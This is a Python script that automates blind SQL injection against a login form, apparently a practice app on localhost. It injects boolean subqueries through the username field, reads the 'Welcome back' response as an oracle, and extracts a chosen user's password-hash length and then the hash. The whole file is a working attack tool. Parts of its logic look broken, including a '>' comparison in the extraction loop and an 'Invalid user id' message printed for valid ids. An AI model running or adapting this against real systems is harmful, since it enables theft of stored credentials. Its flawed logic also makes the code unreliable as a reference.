#!/usr/bin/env python3
'''
Date : 1401/12/24
Author : AmirhosseinKhanshabani - @AmirZoyber
Description: an script for exploiting blind SQL injection.  
'''

import requests

totalQuery = 0
#charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:<>?~`-=[]\;',./"
charset  = "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back" # the string that we want to find in the response

def injected_query(payload):  # blind sql injection
    global totalQuery
    r = requests.post(target, data={"username": "admin' and {}--".format(payload), "password": "password"})
    totalQuery += 1
    return needle.encode() not in r.content

def bool_query(offset, user_id, character, operator=">"): # create a boolean query
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

def invalid_user(user_id): # check if the user id is valid
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

def password_length(user_id): # identify the length of the user password hash
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

def extract_hash(charset,user_id,password_lenght):
    found = ""
    for p in range(password_lenght):
        for c in range(len(charset)):
            if bool_query(p, user_id, charset[c]):
                found += charset[c]
                break
    return found

def total_queries_taken():
    global totalQuery
    print("Total queries taken: {}".format(totalQuery))
    totalQuery = 0

while True:
    try:
        user_id = (input("Enter user id: "))
        if not invalid_user(user_id):
            print("Invalid user id")
            userPasswordLenght = password_length(user_id)
            print(f"User {user_id} hash lenght is {userPasswordLenght}")
            total_queries_taken()
            print("User {} hash is: {}".format(user_id,extract_hash(charset,int(user_id),userPasswordLenght)))
            total_queries_taken()
        else:
            print(f"Invalid user id -> {user_id}")
    except KeyboardInterrupt:
        break
        
